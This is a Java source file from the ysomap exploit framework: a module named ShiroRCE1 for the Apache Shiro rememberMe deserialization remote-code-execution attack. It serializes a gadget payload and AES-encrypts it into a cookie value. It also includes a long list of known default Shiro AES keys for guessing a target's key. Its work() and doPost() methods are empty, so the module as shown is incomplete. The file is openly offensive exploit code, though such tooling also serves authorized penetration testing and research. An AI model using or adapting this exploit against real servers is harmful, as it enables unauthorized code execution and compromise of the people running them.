package ysomap.core.exploit.framework.shiro;

import ysomap.common.annotation.Exploits;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Exploit;
import ysomap.core.bean.Payload;
import ysomap.core.serializer.SerializerFactory;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

/**
 * @author wh1t3P1g
 * @since 2020/4/1
 */
@Exploits
@SuppressWarnings({"rawtypes"})
public class ShiroRCE1 extends Exploit {

    @Require(name = "key", detail = "设置shiro AES Key，如果为空，则使用默认key列表")
    public String key = null;

    @NotNull
    @Require(name = "url", detail = "目标url")
    public String url = null;

    @NotNull
    public Payload payload;
    public String payloadName;

    @Override
    public void work() {

    }

    @Override
    public void stop() {
        exit = true;
    }

    public String doEncrypt(String key) throws Exception {
        byte[] plainbytes = (byte[]) SerializerFactory.createSerializer("default").serialize(payload);
        byte[] keybytes = key.getBytes();
        SecretKeySpec skeySpec = new SecretKeySpec(keybytes, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");//"算法/模式/补码方式"
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
        byte[] encrypted = cipher.doFinal(plainbytes);
        return Base64.getEncoder().encodeToString(encrypted);
    }

    public void doPost(String cookie){

    }

    private static String[] DEFAULT_KEYS = {
            "kPH+bIxk5D2deZiIxcaaaA==",
            "wGiHplamyXlVB11UXWol8g==",
            "2AvVhdsgUs0FSA3SDFAdag==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "U3ByaW5nQmxhZGUAAAAAAA==",
            "wGiHplamyXlVB11UXWol8g==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==",
            "L7RioUULEFhRyxM7a2R/Yg==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "r0e3c16IdVkouZgk1TKVMg==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "bWluZS1hc3NldC1rZXk6QQ==",
            "a2VlcE9uR29pbmdBbmRGaQ==",
            "WcfHGU25gNnTxTlmJMeSpw==",
            "MTIzNDU2Nzg5MGFiY2RlZg==",
            "5AvVhmFLUs0KTA3Kprsdag==",
            "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==",
            "2cVtiE83c4lIrELJwKGJUw==",
            "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==",
            "sHdIjUN6tzhl8xZMG3ULCQ==",
            "O4pdf+7e+mZe8NyxMTPJmQ==",
            "f/SY5TIve5WWzT4aQlABJA==",
            "HWrBltGvEZc14h9VpMvZWw==",
            "rPNqM6uKFCyaL10AK51UkQ==",
            "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==",
            "MPdCMZ9urzEA50JDlDYYDg==",
            "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==",
            "ClLk69oNcA3m+s0jIMIkpg==",
            "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==",
            "ZmFsYWRvLnh5ei5zaGlybw==",
            "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==",
            "yeAAo1E8BOeAYfBlm4NG9Q==",
            "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==",
            "XgGkgqGqYrix9lI6vxcrRw==",
            "25BsmdYwjnfcWmnhAciDDg==",
            "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==",
            "s0KTA3mFLUprK4AvVhsdag==",
            "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==",
            "d2ViUmVtZW1iZXJNZUtleQ==",
            "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==",
            "4BvVhmFLUs0KTA3Kprsdag==",
            "MzVeSkYyWTI2OFVLZjRzZg=="};
}
